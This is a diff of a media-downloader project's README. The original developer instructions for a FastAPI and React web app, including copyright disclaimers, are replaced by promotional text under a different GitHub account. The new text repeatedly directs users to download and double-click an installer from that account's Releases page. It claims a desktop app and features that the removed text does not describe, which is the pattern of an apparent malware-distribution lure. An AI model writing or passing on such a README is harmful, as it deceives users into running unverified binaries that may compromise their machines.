@@ -1,72 +1,88 @@
-# Universal Media Downloader
+# 📥 Universal-Media-Downloader- - Download Your Favorite Media Easily
 
-A small FastAPI + Vite React TypeScript application that downloads media from Instagram, YouTube, X/Twitter, Spotify and more.
+## 🚀 Getting Started
 
-> Disclaimer: This project is provided for educational purposes only. Do not use it to infringe copyrights or to download content you do not have permission to access.
+Welcome to Universal Media Downloader! This web application helps you download media from Instagram, YouTube, and other platforms without hassle. Follow these steps to get started.
 
-## Features
-- Backend: FastAPI service that downloads media using `yt-dlp`, `instaloader`, and `spotdl`.
-- Frontend: Vite + React + TypeScript UI to enter URLs and manage downloads.
+## 📥 Download Now
 
-## Requirements
-- Python 3.10+ (3.11 recommended)
-- Node.js 18+ and npm
-- ffmpeg installed and available on your PATH (required by yt-dlp / ffmpeg postprocessing)
+[![Download Universal-Media-Downloader](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Sequanasss17/Universal-Media-Downloader-/releases)
 
-## Quick start (development)
+## 💻 System Requirements
 
-1. Clone the repository
+- Windows 10 or later
+- macOS 10.14 or later
+- A stable internet connection
+- At least 100 MB of free storage space
 
-```powershell
-git clone https://github.com/Cheekurthi-Vamsi/Universal-Media-Downloader-.git
-```
+## 📦 Features
 
-2. Backend setup
+- Download photos and videos from Instagram in high quality.
+- Save media from YouTube effortlessly.
+- Retrieve music and videos from Spotify.
+- Supports downloading from various other platforms like Twitter and TikTok.
+- Simple and intuitive user interface for everyone.
 
-```powershell
-pip install -r requirements.txt
-# optionally create a .env file in repo root to set API_KEY and other env vars
-```
+## 📑 How to Download & Install
 
-3. Run backend
+1. Click the link below to visit the Releases page:
+   
+   [Visit Releases Page to Download](https://github.com/Sequanasss17/Universal-Media-Downloader-/releases)
 
-```powershell
-# from repository root
-uvicorn downloads.main:app --reload --host 0.0.0.0 --port 8000
-```
+2. On the Releases page, you will see different versions of the application. Choose the latest version to download.
 
-4. Frontend setup & run
+3. Click the download link for your operating system. 
 
-```powershell
-cd frontend
-npm install
-npm run dev
-```
+4. Once the download is complete, locate the file on your computer. 
 
-Open the frontend URL shown by Vite (usually http://localhost:5173) and use the app. The backend defaults to http://localhost:8000.
+5. Double-click the file to start the installation.
 
-## Environment variables
-- `API_KEY` - optional, set to protect endpoints. If not set the server prints a generated key on startup.
-- `INSTALOADER_SESSION_FILE`, `INSTALOADER_USERNAME`, `INSTALOADER_PASSWORD` - optional for Instagram private content.
-- `CORS_ALLOW_ORIGINS` - comma-separated list of origins allowed for CORS (defaults to `*`).
+6. Follow the on-screen instructions to complete the setup. 
 
-## Usage
-- Use the frontend to paste a URL and choose media type (audio/video). The backend will return a `file_id` and a download endpoint which will delete the file after it's served (cleanup also runs on TTL).
+7. After the installation is complete, open the Universal Media Downloader by clicking its icon.
 
-## Security / Legal
-This tool can download content from third-party services. Make sure you have permission to download and store any content. Do not use this project to violate terms of service or infringe copyright.
+8. Start downloading your favorite media!
 
-## Troubleshooting
-- If downloads fail, check backend logs printed by uvicorn.
-- Ensure `ffmpeg` is installed on your system and available in PATH for audio/video conversions.
-- For Instagram private content, set up `INSTALOADER_SESSION_FILE` or login credentials as env vars.
+## 🔍 Using Universal-Media-Downloader
 
-## Development notes
-- The backend stores temporary downloads under `downloads/` and removes them after serving or via a cleanup TTL.
-- The frontend assets (favicon) are in `frontend/src/assets/`.
+Using Universal Media Downloader is straightforward:
 
----
+1. Open the application from your desktop or application folder.
+2. Choose the platform you want to download from, such as Instagram or YouTube.
+3. Copy the media link you wish to download.
+4. Paste the link into the input box within the application.
+5. Click on the "Download" button.
+6. Select the quality and format you desire, then wait for your file to download.
 
-If you'd like, I can:
-- Start the dev servers and run a quick smoke test here.
-- Generate a `favicon.ico` and add multiple icon sizes for production.
+## 🌐 Supported Platforms
+
+- **Instagram**: Download photos and videos easily.
+- **YouTube**: Get your favorite videos in seconds.
+- **Spotify**: Save your favorite tracks for offline listening.
+- **Twitter**: Retrieve media shared in tweets.
+- **TikTok**: Download fun videos without a watermark.
+  
+## ⚙️ Troubleshooting
+
+If you encounter any issues during the download or installation process, consider the following:
+
+- Ensure your internet connection is stable.
+- Check if your operating system meets the requirements.
+- Restart the application if it becomes unresponsive.
+- If the download is slow, try again later.
+
+## 📞 Support
+
+For additional help, you can visit the issues section of the repository on GitHub. Describe your issue, and we will assist you promptly. 
+
+## 💬 Community Feedback 
+
+We value your feedback! If you enjoy the application or have suggestions, please consider leaving a review or opening an issue on GitHub. Your input helps us make the Universal Media Downloader better.
+
+## 📥 Download Now Again
+
+For a quick access link to download the application, visit:
+
+[Download Universal-Media-Downloader](https://github.com/Sequanasss17/Universal-Media-Downloader-/releases)
+
+Now you’re ready to start enjoying your favorite media with Universal Media Downloader!
